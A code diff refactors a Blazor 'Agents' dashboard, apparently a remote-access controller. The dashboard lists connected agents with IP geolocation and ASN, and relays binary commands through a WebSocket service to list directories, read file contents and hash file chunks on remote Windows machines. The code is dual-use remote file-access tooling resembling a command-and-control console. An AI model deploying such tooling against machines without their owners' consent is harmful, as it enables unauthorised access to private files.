@@ -1,10 +1,9 @@
 @page "/agents"
 @inject HttpClient Http
-@inject IJSRuntime JS
+@inject WindowManager Wm
 @using System.Net.WebSockets
 @using System.Text
 @using System.Text.Json
-@using cc.Components
 @implements IAsyncDisposable
 
 <PageTitle>Agents</PageTitle>
@@ -31,9 +30,9 @@ else
                 <p class="card-text display-6 mb-0">@agents.Count</p>
             </div>
             <div class="ms-auto d-flex align-items-center gap-2">
-                @if (relayedAgentId is not null)
+                @if (Wm.Relay.ConnectedAgentId is not null)
                 {
-                    <span class="badge bg-info">Relay: <code class="text-white">@relayedAgentId</code></span>
+                    <span class="badge bg-info">Relay: <code class="text-white">@Wm.Relay.ConnectedAgentId</code></span>
                 }
                 <span class="badge @(eventsConnected ? "bg-success" : "bg-danger")">
                     @(eventsConnected ? "Live" : "Disconnected")
@@ -72,15 +71,15 @@ else
                 <tbody>
                     @foreach (var agent in agents.Connections)
                     {
-                        <tr class="@(relayedAgentId == agent.Id ? "table-active" : "")"
+                        <tr class="@(Wm.Relay.ConnectedAgentId == agent.Id ? "table-active" : "")"
                             style="cursor:context-menu"
                             @oncontextmenu="(e) => ShowContextMenu(e, agent.Id)"
                             @oncontextmenu:preventDefault="true">
                             <td><code>@agent.Id</code></td>
                             <td><code>@agent.Ip</code></td>
-                            <td>@FormatLocation(agent)</td>
-                            <td>@FormatNetwork(agent)</td>
-                            <td>@FormatTimestamp(agent.ConnectedAt)</td>
+                            <td>@Formatters.FormatLocation(agent)</td>
+                            <td>@Formatters.FormatNetwork(agent)</td>
+                            <td>@Formatters.FormatTimestamp(agent.ConnectedAt)</td>
                             <td>@agent.MessageCount</td>
                             <td>
                                 @if (agent.Relayed)
@@ -105,7 +104,7 @@ else
 {
     <div class="position-fixed top-0 start-0 w-100 h-100" style="z-index:1050;" @onclick="HideContextMenu" @oncontextmenu="HideContextMenu" @oncontextmenu:preventDefault="true"></div>
     <div class="dropdown-menu show shadow" style="position:fixed;left:@(ctxX)px;top:@(ctxY)px;z-index:1051;">
-        @if (relayedAgentId == ctxAgentId)
+        @if (Wm.Relay.ConnectedAgentId == ctxAgentId)
         {
             <button class="dropdown-item" @onclick="OpenPanelFiles">File Manager</button>
             <button class="dropdown-item" @onclick="OpenPanelCommands">Commands</button>
@@ -116,7 +115,7 @@ else
         {
             <span class="dropdown-item-text text-muted small">Relay already in use</span>
         }
-        else if (relayedAgentId is null)
+        else if (Wm.Relay.ConnectedAgentId is null)
         {
             <button class="dropdown-item" @onclick="CtxConnectFiles">File Manager</button>
             <button class="dropdown-item" @onclick="CtxConnectCommands">Commands</button>
@@ -125,57 +124,6 @@ else
         {
             <span class="dropdown-item-text text-muted small">Already connected to another agent</span>
         }
-    </div>
-}
-
-@* Floating windows *@
-@foreach (var win in windows)
-{
-    <div class="app-window @(win.Maximized ? "maximized" : "") @(win.Minimized ? "minimized" : "")"
-         style="@(win.Maximized ? "" : $"left:{win.X}px;top:{win.Y}px;width:{win.Width}px;height:{win.Height}px;")">
-        <div class="app-window-titlebar" @onmousedown="(e) => StartDrag(e, win)">
-            <span class="app-window-title">@win.Title — @(relayedAgentId ?? "")</span>
-            <button class="app-window-btn" @onclick="() => ToggleMinimize(win)" title="@(win.Minimized ? "Restore" : "Minimize")">@(win.Minimized ? "\u25a1" : "\u2014")</button>
-            <button class="app-window-btn" @onclick="() => ToggleMaximize(win)" title="@(win.Maximized ? "Restore" : "Maximize")">@(win.Maximized ? "\u29c9" : "\u25a1")</button>
-            <button class="app-window-btn close-btn" @onclick="() => CloseWindow(win)" title="Close">&times;</button>
-        </div>
-        <div class="app-window-body">
-            @if (win.Panel == "File Manager")
-            {
-                <FileManager @ref="fileManagerRef" RelayWs="relayWs" />
-            }
-            else if (win.Panel == "Commands")
-            {
-                <div>
-                    <div class="mb-3">
-                        <button class="btn btn-outline-primary btn-sm me-2" @onclick="SendGetUUID" disabled="@sending">GetUUID</button>
-                    </div>
-
-                    <div class="mb-3">
-                        <label class="form-label">Path</label>
-                        <input class="form-control form-control-sm" @bind="commandPath" placeholder="C:\" />
-                    </div>
-
-                    <div class="d-flex gap-2 flex-wrap mb-3">
-                        <button class="btn btn-outline-primary btn-sm" @onclick="SendGetDirectoryContent" disabled="@sending">GetDirectoryContent</button>
-
-                        <div class="d-flex align-items-center gap-2">
-                            <button class="btn btn-outline-primary btn-sm" @onclick="SendGetFileContent" disabled="@sending">GetFileContent</button>
-                            <input class="form-control form-control-sm" style="width:100px" @bind="readCount" placeholder="Size" type="number" />
-                            <input class="form-control form-control-sm" style="width:100px" @bind="fileOffset" placeholder="Offset" type="number" />
-                        </div>
-
-                        <div class="d-flex align-items-center gap-2">
-                            <button class="btn btn-outline-primary btn-sm" @onclick="SendGetFileChunkHash" disabled="@sending">GetFileChunkHash</button>
-                            <input class="form-control form-control-sm" style="width:100px" @bind="chunkSize" placeholder="Chunk" type="number" />
-                            <input class="form-control form-control-sm" style="width:100px" @bind="hashOffset" placeholder="Offset" type="number" />
-                        </div>
-                    </div>
-
-                    <pre class="bg-dark text-light p-3 rounded" style="max-height:300px;overflow-y:auto;white-space:pre-wrap;font-size:0.85rem;">@output</pre>
-                </div>
-            }
-        </div>
     </div>
 }
 
@@ -189,25 +137,6 @@ else
     // Events WebSocket
     private ClientWebSocket? eventsWs;
     private CancellationTokenSource? eventsCts;
-
-    // Relay
-    private ClientWebSocket? relayWs;
-    private string? relayedAgentId;
-    private bool sending;
-
-    // Raw commands
-    private string commandPath = @"C:\";
-    private long readCount = 4096;
-    private long fileOffset;
-    private long chunkSize = 4096;
-    private long hashOffset;
-    private string output = "";
-
-    // Windows
-    private List<WindowState> windows = new();
-    private int nextWindowId;
-    private FileManager? fileManagerRef;
-    private DotNetObjectReference<Agents>? dotnetRef;
 
     // Context menu
     private bool ctxVisible;
@@ -230,10 +159,7 @@ else
         ctxVisible = true;
     }
 
-    private void HideContextMenu()
-    {
-        ctxVisible = false;
-    }
+    private void HideContextMenu() => ctxVisible = false;
 
     private bool IsCtxAgentRelayed()
     {
@@ -246,7 +172,7 @@ else
         if (ctxAgentId is not null)
         {
             await ConnectToAgent(ctxAgentId);
-            OpenWindow("File Manager");
+            Wm.OpenWindow("File Manager");
         }
     }
 
@@ -256,92 +182,18 @@ else
         if (ctxAgentId is not null)
         {
             await ConnectToAgent(ctxAgentId);
-            OpenWindow("Commands");
+            Wm.OpenWindow("Commands");
         }
     }
 
     private async Task CtxDisconnect()
     {
         HideContextMenu();
-        await DisconnectRelay();
+        await Wm.DisconnectRelay();
     }
 
-    private void OpenPanelFiles() { HideContextMenu(); OpenWindow("File Manager"); }
-    private void OpenPanelCommands() { HideContextMenu(); OpenWindow("Commands"); }
-
-    // --- Window management ---
-
-    private class WindowState
-    {
-        public int Id { get; set; }
-        public string Panel { get; set; } = "";
-        public string Title { get; set; } = "";
-        public double X { get; set; }
-        public double Y { get; set; }
-        public double Width { get; set; }
-        public double Height { get; set; }
-        public bool Minimized { get; set; }
-        public bool Maximized { get; set; }
-    }
-
-    private void OpenWindow(string panel)
-    {
-        var existing = windows.FirstOrDefault(w => w.Panel == panel);
-        if (existing is not null)
-        {
-            existing.Minimized = false;
-            return;
-        }
-
-        var offset = windows.Count * 30;
-        windows.Add(new WindowState
-        {
-            Id = nextWindowId++,
-            Panel = panel,
-            Title = panel,
-            X = 100 + offset,
-            Y = 80 + offset,
-            Width = panel == "File Manager" ? 800 : 700,
-            Height = 500
-        });
-    }
-
-    private void CloseWindow(WindowState win)
-    {
-        windows.Remove(win);
-    }
-
-    private void ToggleMinimize(WindowState win)
-    {
-        win.Minimized = !win.Minimized;
-        if (win.Minimized) win.Maximized = false;
-    }
-
-    private void ToggleMaximize(WindowState win)
-    {
-        win.Maximized = !win.Maximized;
-        if (win.Maximized) win.Minimized = false;
-    }
-
-    private int? _draggingWindowId;
-
-    private async Task StartDrag(MouseEventArgs e, WindowState win)
-    {
-        if (win.Maximized || win.Minimized) return;
-        _draggingWindowId = win.Id;
-        dotnetRef ??= DotNetObjectReference.Create(this);
-        await JS.InvokeVoidAsync("windowDrag.startDrag", dotnetRef, win.Id, e.ClientX, e.ClientY, win.X, win.Y);
-    }
-
-    [JSInvokable]
-    public void OnDragMove(double x, double y)
-    {
-        var win = windows.FirstOrDefault(w => w.Id == _draggingWindowId);
-        if (win is null) return;
-        win.X = Math.Max(0, x);
-        win.Y = Math.Max(0, y);
-        InvokeAsync(StateHasChanged);
-    }
+    private void OpenPanelFiles() { HideContextMenu(); Wm.OpenWindow("File Manager"); }
+    private void OpenPanelCommands() { HideContextMenu(); Wm.OpenWindow("Commands"); }
 
     // --- Events WebSocket ---
 
@@ -349,8 +201,8 @@ else
     {
         eventsCts?.Cancel();
         agents = null;
-        if (relayedAgentId is not null)
-            await DisconnectRelay();
+        if (Wm.Relay.ConnectedAgentId is not null)
+            await Wm.DisconnectRelay();
     }
 
     private void ReconnectEvents()
@@ -399,8 +251,8 @@ else
             {
                 eventsConnected = false;
                 agents = null;
-                if (relayedAgentId is not null)
-                    await DisconnectRelay();
+                if (Wm.Relay.ConnectedAgentId is not null)
+                    await Wm.DisconnectRelay();
                 await InvokeAsync(StateHasChanged);
             }
             finally
@@ -409,8 +261,8 @@ else
                 eventsWs = null;
                 eventsConnected = false;
                 agents = null;
-                if (relayedAgentId is not null)
-                    await DisconnectRelay();
+                if (Wm.Relay.ConnectedAgentId is not null)
+                    await Wm.DisconnectRelay();
             }
 
             if (!token.IsCancellationRequested)
@@ -442,9 +294,9 @@ else
                     Connections = agentArray
                 };
 
-                if (relayedAgentId is not null && !agentArray.Any(a => a.Id == relayedAgentId))
+                if (Wm.Relay.ConnectedAgentId is not null && !agentArray.Any(a => a.Id == Wm.Relay.ConnectedAgentId))
                 {
-                    _ = DisconnectRelay();
+                    _ = Wm.DisconnectRelay();
                 }
 
                 error = null;
@@ -476,9 +328,9 @@ else
                         Connections = list.ToArray()
                     };
 
-                    if (relayedAgentId == agent.Id)
+                    if (Wm.Relay.ConnectedAgentId == agent.Id)
                     {
-                        _ = DisconnectRelay();
+                        _ = Wm.DisconnectRelay();
                         error = "Agent disconnected.";
                     }
                 }
@@ -499,223 +351,19 @@ else
         try
         {
             error = null;
-            relayWs = new ClientWebSocket();
-            await relayWs.ConnectAsync(new Uri($"wss://relay.nostdlib.workers.dev/relay/{agentId}"), CancellationToken.None);
-            relayedAgentId = agentId;
-            output = "Connected. Ready to send commands.\n";
-            fileManagerRef?.Reset();
+            await Wm.Relay.Connect(agentId);
+            Wm.Output = "Connected. Ready to send commands.\n";
         }
         catch (Exception ex)
         {
             error = $"Connection failed: {ex.Message}";
-            relayWs?.Dispose();
-            relayWs = null;
+            await Wm.Relay.Disconnect();
         }
-    }
-
-    private async Task DisconnectRelay()
-    {
-        if (relayWs is not null)
-        {
-            try { await relayWs.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
-            relayWs.Dispose();
-            relayWs = null;
-        }
-        relayedAgentId = null;
-        windows.Clear();
-        output = "";
-    }
-
-    // --- Raw commands ---
-
-    private async Task SendGetUUID()
-    {
-        var response = await SendAndReceive(new byte[] { 0x00 });
-        if (response is null) return;
-
-        if (response.Length >= 4)
-        {
-            var status = BitConverter.ToUInt32(response, 0);
-            if (status == 0 && response.Length >= 20)
-            {
-                var uuid = new Guid(response.AsSpan(4, 16));
-                output += $"UUID: {uuid}\n";
-            }
-            else
-            {
-                output += $"Error: status={status}\n";
-            }
-        }
-    }
-
-    private async Task SendGetDirectoryContent()
-    {
-        var payload = BuildPathCommand(0x01, commandPath);
-        var response = await SendAndReceive(payload);
-        if (response is null) return;
-
-        if (response.Length < 4) return;
-        var status = BitConverter.ToUInt32(response, 0);
-        if (status != 0) { output += $"Error: status={status}\n"; return; }
-        if (response.Length < 12) return;
-
-        var entryCount = BitConverter.ToUInt64(response, 4);
-        output += $"Directory: {commandPath} ({entryCount} entries)\n";
-
-        const int EntrySize = 545; // packed DirectoryEntry struct
-        var offset = 12;
-        for (ulong i = 0; i < entryCount && offset + EntrySize <= response.Length; i++)
-        {
-            // Name: WCHAR[256] = 512 bytes fixed buffer
-            var nameLen = 0;
-            for (int c = 0; c < 256; c++)
-            {
-                if (BitConverter.ToChar(response, offset + c * 2) == '\0') break;
-                nameLen++;
-            }
-            var name = Encoding.Unicode.GetString(response, offset, nameLen * 2);
-            var isDir = response[offset + 540] != 0;
-            var isDrive = response[offset + 541] != 0;
-            var size = BitConverter.ToUInt64(response, offset + 528);
-            offset += EntrySize;
-
-            var prefix = isDir ? "[DIR] " : isDrive ? "[DRV] " : "";
-            var sizeStr = (!isDir && !isDrive) ? $" ({size} bytes)" : "";
-            output += $"  {prefix}{name}{sizeStr}\n";
-        }
-    }
-
-    private async Task SendGetFileContent()
-    {
-        var pathBytes = Encoding.Unicode.GetBytes(commandPath + "\0");
-        var payload = new byte[1 + 8 + 8 + pathBytes.Length];
-        payload[0] = 0x02;
-        BitConverter.TryWriteBytes(payload.AsSpan(1), (ulong)readCount);
-        BitConverter.TryWriteBytes(payload.AsSpan(9), (ulong)fileOffset);
-        pathBytes.CopyTo(payload, 17);
-
-        var response = await SendAndReceive(payload);
-        if (response is null) return;
-
-        if (response.Length < 4) return;
-        var status = BitConverter.ToUInt32(response, 0);
-        if (status != 0) { output += $"Error: status={status}\n"; return; }
-        if (response.Length < 12) return;
-
-        var bytesRead = BitConverter.ToUInt64(response, 4);
-        var data = response.AsSpan(12, (int)Math.Min((int)bytesRead, response.Length - 12));
-        try
-        {
-            output += $"File: {commandPath} ({bytesRead} bytes)\n{Encoding.UTF8.GetString(data)}\n";
-        }
-        catch
-        {
-            output += $"File: {commandPath} ({bytesRead} bytes)\n{Convert.ToHexString(data)}\n";
-        }
-    }
-
-    private async Task SendGetFileChunkHash()
-    {
-        var pathBytes = Encoding.Unicode.GetBytes(commandPath + "\0");
-        var payload = new byte[1 + 8 + 8 + pathBytes.Length];
-        payload[0] = 0x03;
-        BitConverter.TryWriteBytes(payload.AsSpan(1), (ulong)chunkSize);
-        BitConverter.TryWriteBytes(payload.AsSpan(9), (ulong)hashOffset);
-        pathBytes.CopyTo(payload, 17);
-
-        var response = await SendAndReceive(payload);
-        if (response is null) return;
-
-        if (response.Length < 4) return;
-        var status = BitConverter.ToUInt32(response, 0);
-        if (status != 0) { output += $"Error: status={status}\n"; return; }
-        if (response.Length < 36) return;
-
-        output += $"SHA-256: {Convert.ToHexString(response.AsSpan(4, 32))}\n";
-    }
-
-    // --- Shared helpers ---
-
-    private byte[] BuildPathCommand(byte cmd, string path)
-    {
-        var pathBytes = Encoding.Unicode.GetBytes(path + "\0");
-        var payload = new byte[1 + pathBytes.Length];
-        payload[0] = cmd;
-        pathBytes.CopyTo(payload, 1);
-        return payload;
-    }
-
-    private async Task<byte[]?> SendAndReceive(byte[] payload)
-    {
-        if (relayWs is null || relayWs.State != WebSocketState.Open)
-        {
-            error = "Not connected";
-            return null;
-        }
-
-        sending = true;
-        StateHasChanged();
-
-        try
-        {
-            await relayWs.SendAsync(payload, WebSocketMessageType.Binary, true, CancellationToken.None);
-
-            var buffer = new byte[65536];
-            using var ms = new MemoryStream();
-            WebSocketReceiveResult result;
-            do
-            {
-                result = await relayWs.ReceiveAsync(buffer, CancellationToken.None);
-                ms.Write(buffer, 0, result.Count);
-            } while (!result.EndOfMessage);
-
-            error = null;
-            return ms.ToArray();
-        }
-        catch (Exception ex)
-        {
-            error = $"Command failed: {ex.Message}";
-            return null;
-        }
-        finally
-        {
-            sending = false;
-            StateHasChanged();
-        }
-    }
-
-    private static string FormatTimestamp(double ms)
-    {
-        return DateTimeOffset.FromUnixTimeMilliseconds((long)ms).LocalDateTime.ToString("g");
-    }
-
-    private static string FormatLocation(AgentConnection c)
-    {
-        var parts = new List<string>();
-        if (!string.IsNullOrEmpty(c.City)) parts.Add(c.City);
-        if (!string.IsNullOrEmpty(c.Region) && c.Region != c.City) parts.Add(c.Region);
-        if (!string.IsNullOrEmpty(c.Country)) parts.Add(c.Country);
-        return parts.Count > 0 ? string.Join(", ", parts) : "-";
-    }
-
-    private static string FormatNetwork(AgentConnection c)
-    {
-        if (c.Asn > 0 && !string.IsNullOrEmpty(c.AsOrganization))
-            return $"AS{c.Asn} ({c.AsOrganization})";
-        if (c.Asn > 0)
-            return $"AS{c.Asn}";
-        return "-";
     }
 
     public async ValueTask DisposeAsync()
     {
         eventsCts?.Cancel();
         eventsCts?.Dispose();
-        dotnetRef?.Dispose();
-        if (relayWs is not null)
-        {
-            try { await relayWs.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
-            relayWs.Dispose();
-        }
     }
 }
